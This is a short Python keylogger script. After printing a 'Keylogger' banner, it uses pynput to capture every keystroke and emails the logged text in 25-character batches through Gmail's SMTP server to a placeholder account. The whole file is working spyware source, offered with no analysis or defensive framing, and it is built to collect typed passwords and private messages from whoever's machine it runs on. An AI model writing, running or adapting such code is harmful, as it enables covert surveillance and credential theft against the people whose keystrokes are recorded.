import getpass
import smtplib

from pynput.keyboard import Key, Listener

print('''
  _  __          _
 | |/ /         | |
 | ' / ___ _   _| | ___   __ _  __ _  ___ _ __
 |  < / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
 | . \  __/ |_| | | (_) | (_| | (_| |  __/ |
 |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|
            __/ |         __/ | __/ |
           |___/         |___/ |___/
''')
# email

email = "youremail@gmail.com"
password = "yourpassword"
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

# logger

log = ''
word = ''
char_limit = 25

def on_press(key):
    global word
    global log
    global email
    global char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        log += word
        word = ''
        if len(log) >= char_limit:
            send_log()
            log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False

def send_log():
    server.sendmail(
    email,
    email,
    log
    )

with Listener( on_press=on_press ) as listener:
    listener.join()
